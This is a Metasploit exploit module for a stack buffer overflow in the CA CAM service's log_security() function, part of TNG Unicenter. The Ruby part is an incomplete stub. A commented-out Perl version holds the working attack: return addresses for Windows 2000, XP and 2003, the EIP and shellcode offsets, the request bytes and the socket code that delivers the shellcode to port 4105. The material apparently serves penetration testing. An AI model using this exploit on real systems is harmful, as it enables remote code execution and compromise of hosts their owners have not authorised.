require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA CAM log_security() Stack Overflow (Win32)',
			'Description'    => %q{
				This module exploits a vulnerability in the CA CAM service
				by passing a long parameter to the log_security() function.
				The CAM service is part of TNG Unicenter. This module has
				been tested on Unicenter v3.1.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cacam_logsecurity_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'CA CAM log_security() Stack Overflow (Win32)',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 4105],
	  },

	'Payload' =>
	  {
		'Space'     => 1024,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA CAM service by passing
		a long parameter to the log_security() function. The CAM service is part
		of TNG Unicenter. This module has been tested on Unicenter v3.1.
}),

	'Refs'    =>
	  [
	
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [	  
	  	# W2API.DLL @ 0x01950000 - return to ESI
		# $Header$
		['W2API.DLL TNG 2.3', 0x01951107], 
		
		# return to ESI in ws2help.dll
		['Windows 2000 SP0-SP4 English', 0x750217ae],
		['Windows XP SP0-SP1 English',   0x71aa16e5],
		['Windows XP SP2 English',       0x71aa1b22],
		['Windows 2003 SP0 English',     0x71bf175f],
	  ],

	'Keys'    => ['cam'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);


	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $pattern = Pex::Text::EnglishText(4096);

	# Offset 1016 for EIP, 1024 = ESP, 1052 = ESI
	substr($pattern, 1016, 4, pack('V', $target->[1]));
	substr($pattern, 1052, length($shellcode), $shellcode);

	my $req =
		"\xfa\xf9\x00\x10" . $pattern . "\x00";

	my $ack = $s->Recv(4, 5);
	if ($ack ne "ACK\x00") {
		$self->PrintLine("[*] The CAM service is not responding.");
		return;
	}
	$s->Send($req);
	$s->Recv(-1,1);
	$self->Handler($s);
	$s->Close();

	return;
}

1;

=end


end
end	
